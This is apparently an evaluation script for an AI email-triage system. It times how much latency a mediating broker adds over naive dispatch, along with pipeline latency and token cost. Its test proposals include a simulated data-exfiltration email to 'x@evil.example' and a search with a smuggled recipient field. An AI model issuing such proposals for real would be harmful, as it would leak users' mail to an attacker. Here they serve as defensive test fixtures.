"""RQ3 — does mediation cost anything? Latency and cost.

Three measurements, each with its own honest scope:

  broker overhead   time to mediate one proposal through the broker (schema
                    validation, allowlist, three audit writes) versus naive
                    dispatch of the same proposal. Needs no model and no mail.
  pipeline latency  arrival -> ingest -> decision -> alert, from timestamps in
                    the database. Backfilled mail arrived days before it was
                    ingested, so only messages ingested within an hour of
                    arrival are counted as live, and the count is reported.
  cost              provider-reported tokens recorded as `model_usage` audit
                    events, priced with rates you pass in. No model's price is
                    assumed.

    python -m eval.performance --price-in 1.00 --price-out 3.00   # USD per 1M tokens
"""
from __future__ import annotations

import argparse
import json
import statistics
import time
from datetime import datetime
from pathlib import Path

from eval.mock_adapter import MockAdapter
from eval.naive_arm import naive_execute
from telemail.broker.broker import Broker
from telemail.db import Database
from telemail.models import Email, SenderSignals

OUT = Path("data/performance.json")
LIVE_WINDOW_S = 3600
PROPOSALS = [
    {"op": "search", "query": "from:uni.edu", "max_results": 5},
    {"op": "get_thread", "thread_id": "t1"},
    {"op": "send_email", "to": "x@evil.example", "body": "exfil"},
    {"op": "search", "query": "x", "recipient": "x@evil.example"},
]


def _pcts(xs: list[float]) -> dict:
    if not xs:
        return {"n": 0, "p50": None, "p95": None}
    xs = sorted(xs)
    return {"n": len(xs), "p50": round(statistics.median(xs), 3),
            "p95": round(xs[min(len(xs) - 1, int(0.95 * len(xs)))], 3)}


def broker_overhead(n: int = 2000) -> dict:
    db = Database(":memory:")
    db.insert_email(Email(message_id="m1", thread_id="t1", sender_email="a@uni.edu",
                          sender_domain="uni.edu", subject="s", snippet="x",
                          received_at=datetime(2026, 9, 1), signals=SenderSignals()))
    broker, mock = Broker(db, MockAdapter()), MockAdapter()

    def timed(fn) -> list[float]:
        out = []
        for i in range(n):
            p = PROPOSALS[i % len(PROPOSALS)]
            t0 = time.perf_counter_ns()
            fn(p)
            out.append((time.perf_counter_ns() - t0) / 1000)       # microseconds
        return out

    brokered = timed(lambda p: broker.execute(p, actor="planner"))
    naive = timed(lambda p: naive_execute(p, mock))
    db.close()
    b, v = _pcts(brokered), _pcts(naive)
    return {"unit": "microseconds", "brokered": b, "naive": v,
            "overhead_p50": round(b["p50"] - v["p50"], 3)}


def pipeline_latency(db: Database) -> dict:
    alerts = {e["payload"].get("message_id"): datetime.fromisoformat(e["ts"])
              for e in db.audit_entries(event="alert_sent")}
    rows = db.con.execute(
        "SELECT e.message_id, e.received_at, e.ingested_at, t.decided_at "
        "FROM emails e LEFT JOIN triage t USING (message_id)").fetchall()

    ingest, decide, alert, total, live = [], [], [], [], 0
    for r in rows:
        arrived = datetime.fromisoformat(r["received_at"])
        ingested = datetime.fromisoformat(r["ingested_at"])
        lag = (ingested - arrived).total_seconds()
        if not 0 <= lag <= LIVE_WINDOW_S:
            continue                                   # backfill, not live
        live += 1
        ingest.append(lag)
        if r["decided_at"]:
            decided = datetime.fromisoformat(r["decided_at"])
            decide.append((decided - ingested).total_seconds())
            if r["message_id"] in alerts:
                sent = alerts[r["message_id"]]
                alert.append((sent - decided).total_seconds())
                total.append((sent - arrived).total_seconds())
    return {"unit": "seconds", "messages_total": len(rows), "live_messages": live,
            "arrival_to_ingest": _pcts(ingest), "ingest_to_decision": _pcts(decide),
            "decision_to_alert": _pcts(alert), "arrival_to_alert": _pcts(total)}


def cost(db: Database, price_in: float | None, price_out: float | None) -> dict:
    usage = [e["payload"] for e in db.audit_entries(event="model_usage")]
    tin = sum(u.get("prompt_tokens", 0) for u in usage)
    tout = sum(u.get("completion_tokens", 0) for u in usage)
    verdicts = db.source_counts().get("model", 0)
    out = {"calls": len(usage), "prompt_tokens": tin, "completion_tokens": tout,
           "model_verdicts": verdicts, "usd_total": None, "usd_per_1000": None}
    if usage and price_in is not None and price_out is not None:
        usd = tin / 1e6 * price_in + tout / 1e6 * price_out
        out["usd_total"] = round(usd, 4)
        out["usd_per_1000"] = round(usd / verdicts * 1000, 4) if verdicts else None
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--db", default=None)
    ap.add_argument("--n", type=int, default=2000)
    ap.add_argument("--price-in", type=float, default=None, help="USD per 1M input tokens")
    ap.add_argument("--price-out", type=float, default=None, help="USD per 1M output tokens")
    args = ap.parse_args()

    from telemail.config import get_settings
    db = Database(args.db or get_settings().db_path)
    result = {"broker_overhead": broker_overhead(args.n),
              "pipeline_latency": pipeline_latency(db),
              "cost": cost(db, args.price_in, args.price_out)}

    b = result["broker_overhead"]
    print(f"\nbroker   p50 {b['brokered']['p50']} µs  p95 {b['brokered']['p95']} µs")
    print(f"naive    p50 {b['naive']['p50']} µs  p95 {b['naive']['p95']} µs")
    print(f"mediation overhead p50: {b['overhead_p50']} µs per proposal")
    lat = result["pipeline_latency"]
    print(f"\nlive messages: {lat['live_messages']} of {lat['messages_total']}")
    for k in ("arrival_to_ingest", "ingest_to_decision", "decision_to_alert",
              "arrival_to_alert"):
        print(f"  {k:<20} {lat[k]}")
    c = result["cost"]
    print(f"\ncost: {c['calls']} calls, {c['prompt_tokens']} in / "
          f"{c['completion_tokens']} out tokens, per 1000 verdicts: {c['usd_per_1000']}")
    OUT.write_text(json.dumps(result, indent=1))
    print(f"\nwrote {OUT}")


if __name__ == "__main__":
    main()
